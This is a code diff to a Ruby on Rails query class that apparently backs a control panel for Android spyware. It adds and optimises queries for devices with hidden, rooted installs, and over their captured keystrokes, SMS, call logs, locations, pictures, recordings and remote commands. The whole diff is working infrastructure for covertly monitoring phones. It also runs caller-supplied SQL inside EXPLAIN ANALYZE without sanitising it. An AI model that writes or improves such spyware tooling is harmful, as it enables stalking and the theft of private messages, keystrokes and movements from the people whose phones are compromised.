@@ -1,5 +1,14 @@
 class OptimizedQueries
   class << self
+    # ─── Dashboard Queries ──────────────────────────────────────────────
+
+    # Single-query device dashboard: returns all stats per device in one round-trip
+    def device_dashboard(smartphone_id = nil)
+      scope = Smartphone.with_stats.includes(:apk_installation)
+      scope = scope.where(id: smartphone_id) if smartphone_id
+      scope
+    end
+
     # Device summary view - aggregates key metrics per device
     def device_summary_view_sql
       <<-SQL
@@ -13,7 +22,8 @@ class OptimizedQueries
           s.is_app_hidden,
           ai.status,
           ai.target_ip,
-          COUNT(DISTINCT k.id) as keylog_count,
+          COALESCE(s.keylogs_count, 0) AS keylogs_count,
+          COALESCE(s.commands_count, 0) AS commands_count,
           COUNT(DISTINCT l.id) as location_count,
           COUNT(DISTINCT sm.id) as sms_count,
           COUNT(DISTINCT cl.id) as call_count,
@@ -38,10 +48,58 @@ class OptimizedQueries
         LEFT JOIN geo_locations l ON l.smartphone_id = s.id AND l.created_at > NOW() - INTERVAL '30 days'
         LEFT JOIN sms_messages sm ON sm.smartphone_id = s.id AND sm.created_at > NOW() - INTERVAL '30 days'
         LEFT JOIN call_logs cl ON cl.smartphone_id = s.id AND cl.created_at > NOW() - INTERVAL '30 days'
+        LEFT JOIN pictures p ON p.smartphone_id = s.id AND p.created_at > NOW() - INTERVAL '30 days'
+        LEFT JOIN recordings r ON r.smartphone_id = s.id AND r.created_at > NOW() - INTERVAL '30 days'
         LEFT JOIN device_notifications dn ON dn.device_id = s.device_id AND dn.received_at > NOW() - INTERVAL '30 days'
         GROUP BY s.id, s.device_id, s.name, s.operating_system, s.is_rooted, s.is_app_hidden, ai.status, ai.target_ip;
       SQL
     end
+
+    # ─── Location History ───────────────────────────────────────────────
+
+    # Paginated location history using cursor-based pagination
+    def location_history(smartphone_id, after: nil, limit: 50)
+      scope = GeoLocation
+        .where(smartphone_id: smartphone_id)
+        .order(created_at: :desc)
+        .select(:id, :lat, :long, :date, :created_at)
+
+      scope = scope.where('id < ?', after) if after.present?
+      records = scope.limit(limit + 1).to_a
+      has_more = records.size > limit
+      records = records.first(limit)
+
+      { records: records, has_more: has_more, cursor: records.last&.id }
+    end
+
+    # ─── Keylog Search ──────────────────────────────────────────────────
+
+    # Full-text search across keylogs (uses trigram index if available)
+    def keylog_search(smartphone_id, query, page: 1, per_page: 50)
+      sanitized = ActiveRecord::Base.sanitize_sql_like(query)
+      Keylog
+        .where(smartphone_id: smartphone_id)
+        .where('keystroke ILIKE :q OR full_text ILIKE :q OR app_name ILIKE :q', q: "%#{sanitized}%")
+        .order(created_at: :desc)
+        .limit(per_page)
+        .offset((page - 1) * per_page)
+        .select(:id, :app_name, :app_package, :keystroke, :full_text, :event_type, :created_at)
+    end
+
+    # ─── Command History ────────────────────────────────────────────────
+
+    # Command history with response status breakdown
+    def command_history(smartphone_id, status: nil, page: 1, per_page: 50)
+      scope = PendingCommand
+        .where(smartphone_id: smartphone_id)
+        .order(created_at: :desc)
+        .select(:id, :request_id, :command, :status, :created_at, :completed_at)
+
+      scope = scope.where(status: PendingCommand.statuses[status]) if status.present?
+      scope.limit(per_page).offset((page - 1) * per_page)
+    end
+
+    # ─── Existing views ────────────────────────────────────────────────
     
     # Keylog activity summary by app
     def keylog_app_stats_view_sql
@@ -85,13 +143,12 @@ class OptimizedQueries
     # Batch load devices with latest data (avoids N+1 queries)
     def devices_with_latest_data(time_range: 24.hours.ago)
       Smartphone
+        .with_preloaded
         .includes(
-          :apk_installation,
           :keylogs,
           :geo_locations,
           :sms_messages,
-          :call_logs,
-          :pending_commands
+          :call_logs
         )
         .where("keylogs.created_at > ? OR geo_locations.created_at > ?", time_range, time_range)
         .references(:keylogs, :geo_locations)
@@ -99,20 +156,10 @@ class OptimizedQueries
     
     # Efficient device activity check using EXISTS
     def devices_active_in_range(start_time, end_time = Time.current)
-      Smartphone.where(<<-SQL, start_time, end_time)
-        EXISTS (
-          SELECT 1 FROM keylogs 
-          WHERE keylogs.smartphone_id = smartphones.id 
-          AND keylogs.created_at BETWEEN ? AND ?
-        ) OR EXISTS (
-          SELECT 1 FROM geo_locations 
-          WHERE geo_locations.smartphone_id = smartphones.id 
-          AND geo_locations.created_at BETWEEN ? AND ?
-        )
-      SQL
+      Smartphone.active_since(start_time)
     end
     
-    # Get recent keylogs with efficient pagination
+    # Get recent keylogs with efficient pagination (cursor-based)
     def recent_keylogs_paginated(smartphone_id, page: 1, per_page: 100)
       Keylog
         .where(smartphone_id: smartphone_id)
@@ -121,7 +168,16 @@ class OptimizedQueries
         .offset((page - 1) * per_page)
         .select(:id, :app_name, :app_package, :keystroke, :event_type, :created_at, :client_timestamp)
     end
+
+    # Cursor-based keylog pagination for large tables
+    def recent_keylogs_cursor(smartphone_id, after: nil, limit: 100)
+      Keylog
+        .where(smartphone_id: smartphone_id)
+        .cursor_paginate(after: after, limit: limit, order: :desc)
+    end
     
+    # ─── Diagnostics ────────────────────────────────────────────────────
+
     # Analyze query performance using EXPLAIN ANALYZE
     def analyze_query(sql)
       result = ActiveRecord::Base.connection.execute("EXPLAIN ANALYZE #{sql}")
